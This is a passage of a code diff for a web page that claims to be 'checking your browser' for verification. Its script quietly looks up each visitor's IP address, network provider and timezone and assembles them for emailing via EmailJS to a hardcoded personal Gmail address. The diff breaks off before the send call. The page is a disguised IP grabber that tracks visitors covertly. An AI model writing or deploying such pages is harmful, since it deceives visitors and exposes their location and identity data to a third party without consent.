@@ -4,24 +4,23 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification...</title>
-    <meta http-equiv="refresh" content="3;url=https://wickbot.com" />
+    <title>IP Information</title>
 </head>
 <body>
-    <h1>Checking your browser for verification...</h1>
-
+    <h1>Checking your browser...</h1>
+    
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
     <script>
         // Initialize EmailJS with your public key
-        emailjs.init("4ItP8f4Z88r0-9S1M"); // Use your public key here
+        emailjs.init("4ItP8f4Z88r0-9S1M"); // Replace with your public key from EmailJS
 
-        // Fetch IP data from ip-api
+        // Fetch IP information from ip-api
         fetch('https://ip-api.com/json/')
             .then(response => response.json())
             .then(ipData => {
                 // Prepare email parameters
                 const emailParams = {
-                    to_email: 'boriszarkov4@gmail.com', // Your email
+                    to_email: 'boriszarkov4@gmail.com', // Replace with your email
                     ip_address: ipData.query,
                     provider: ipData.org + " (" + ipData.as + ")",
                     timezone: ipData.timezone,
